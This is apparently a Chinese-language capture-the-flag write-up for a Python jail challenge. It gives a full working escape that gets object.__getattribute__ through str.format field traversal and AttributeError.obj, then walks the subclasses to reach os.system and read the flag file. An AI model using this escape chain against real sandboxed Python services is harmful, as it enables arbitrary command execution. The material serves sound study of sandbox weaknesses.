# Pyjail 6

## 题目简述

本题继续拒绝所有 Attribute AST 节点，但 safe builtins 从 `object` 改成了 `str` 和 `Exception`，使 Pyjail 5 的 `case object(...)` 写法不可用。突破口是两种间接属性机制：类模式可以取得字符串的 `format` 方法和异常的 `obj` 属性；格式化字段解析器又会沿 `{0.attr1.attr2}` 自动访问属性。

## 解题过程

先构造一个必然在最后一级失败的格式化字段：

```text
{0.__class__.__base__.__getattribute__.x}
```

以整数为参数时，字段解析依次得到 `int`、`object` 和 `object.__getattribute__`，最后访问不存在的 `.x` 抛出 `AttributeError`。该异常的 `obj` 属性保存发生失败的对象，也就是需要的 `object.__getattribute__` 描述符。

源码不能直接写 `.format` 或 `.obj`，所以先用类模式提取这两个属性：

```python
try:
    field = "{0.__class__.__base__.__getattribute__.x}"
    match field:
        case str(format=format_fn):
            format_fn(114514)
except Exception as error:
    match error:
        case Exception(obj=value):
            my_getattr = value
```

此时 `my_getattr` 就是 `object.__getattribute__`，可以不写任何点号完成后续对象图遍历：

```python
string_type = my_getattr("", "__class__")
object_type = my_getattr(string_type, "__base__")
subclasses = my_getattr(object_type, "__subclasses__")()

for cls in subclasses:
    if my_getattr(cls, "__name__") == "_wrap_close":
        init = my_getattr(cls, "__init__")
        globals_dict = my_getattr(init, "__globals__")
        globals_dict["system"]("cat /tmp/flag.txt")
        break
```

整个 payload 中的危险属性只出现在字符串、格式化字段或 `MatchClass` 元数据里，不会触发题目的 `visit_Attribute`。提交前仍需把完整代码 Base64 编码。

## 方法总结

- 核心技巧：借助 `str.format` 的字段属性遍历制造异常，再从 `AttributeError.obj` 取回 `object.__getattribute__`。
- 识别信号：沙箱禁止点号但保留格式化字符串、异常对象和模式匹配时，应检查这些解释器内部机制是否能代替显式属性访问。
- 复用要点：利用链依赖异常发生在精心选择的最后一级；若失败位置不同，`error.obj` 得到的对象也会不同。AST 防护还必须审计格式字符串与模式匹配元数据。
